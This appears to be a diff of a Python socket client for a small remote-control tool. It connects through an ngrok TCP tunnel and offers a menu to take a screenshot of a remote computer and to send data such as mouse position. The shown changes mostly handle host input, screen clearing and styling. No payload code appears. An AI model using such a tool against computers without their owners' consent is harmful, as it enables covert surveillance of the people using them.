@@ -7,48 +7,61 @@ def def_handler(sig, frame):
     sys.exit(1)
 
 signal.signal(signal.SIGINT, def_handler)
-try :
-    clear = subprocess.run("powershell clear")
-except:
-    pass
+def clear_screen():
+    try :
+        # Windows
+        clear = subprocess.run("powershell clear")
+    except:
+        # Linux
+        clear = subprocess.run("clear")
+clear_screen()
 
-#ip =  input("IP\n==> ")#
-#ip = ip.strip("//")[1]
-#port = int(input("Port\n==> "))
-ip = "0.tcp.ngrok.io"
-port = 13559
+ip =  input("IP\n==> ")
+if "tcp://" in ip or "http://" in ip:
+    ip = ip.split("//")[1]
+port = int(input("Port\n==> "))
+#ip = "8.tcp.ngrok.io"
+#port = 15279
+
+clear_screen()    
+
+print (f"\n[green italic]Try Connect:[/green italic]\n\n[red italic]Ip[/red italic] [yellow]==>[/yellow] [cyan]{ip}[/cyan]\n[red]Port[/red] [yellow]==>[/yellow] [cyan]{port}[/cyan]")
+
+def ascii_string():
+        print ('''[red]
+                        \****__              ____                                              
+                    |    *****\_      --/ *\-__                                          
+                    /_          (_    ./ ,/----'                                         
+            Art by     \__         (_./  /                                                
+            Zud0k4t0     \__           \___----^__                                       
+                        _/   _                  \                                      
+                    |    _/  __/ )\"\ _____         *\                                    
+                    |\__/   /    ^ ^       \____      )                                   
+                    \___--"                    \_____ )                                  
+                                                    "
+        [/red]''')
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     try: 
         s.connect((ip, port))
     except:
-        print ("\n\n[red] [[/red][yellow]![/yellow][red]][/red] [green]The Server is not ON[/green]\n\n")
+        print ("\n\n[red][[/red][yellow]![/yellow][red]][/red] [green]The Server is not ON[/green]\n\n")
         sys.exit(1)
  #   s.send(("hola server\n").encode("utf-8"))
  #   data = s.recv(1024)
  #   print ("\nMensaje del Servidor:\n\n==> {}\n".format((data.decode("utf-8")).strip()))
     d = s.recv(1024).decode("utf-8")
+    clear_screen()
     print (d)
-    print ('''[red]
-                    \****__              ____                                              
-                |    *****\_      --/ *\-__                                          
-                /_          (_    ./ ,/----'                                         
-        Art by     \__         (_./  /                                                
-        Zud0k4t0     \__           \___----^__                                       
-                    _/   _                  \                                      
-                |    _/  __/ )\"\ _____         *\                                    
-                |\__/   /    ^ ^       \____      )                                   
-                \___--"                    \_____ )                                  
-                                                "
-    [/red]''')
+    ascii_string()
     def menu():
         print ('''
-                    [yellow]################[/yellow] MENU [green]@@@@@@@@@@@@@@@[/green]
-                                1) Sacar Captura del Ordenador
-                                2) Enviar Data (Posicion del Mouse)
-                                3) Cerrar la Script
-                                4) clear/cls
-                                5) Show menu
+                    [yellow]###[/yellow] [red]MENU[/red] [green]@@@[/green]
+                    [red blink]1)[/red blink] [yellow italic]Sacar Captura del Ordenador[/yellow italic]
+                    [red blink]2)[/red blink] [yellow italic]Send Data[/yellow italic]
+                    [red blink]3)[/red blink] [yellow italic]Close Script[/yellow italic]
+                    [red blink]4)[/red blink] [yellow italic]Clear Screen[/yellow italic]
+                    [red blink]5)[/red blink] [yellow italic]Help[/yellow italic]
         ''')
     while True:
  #       data = s.recv(1024).decode("utf-8")
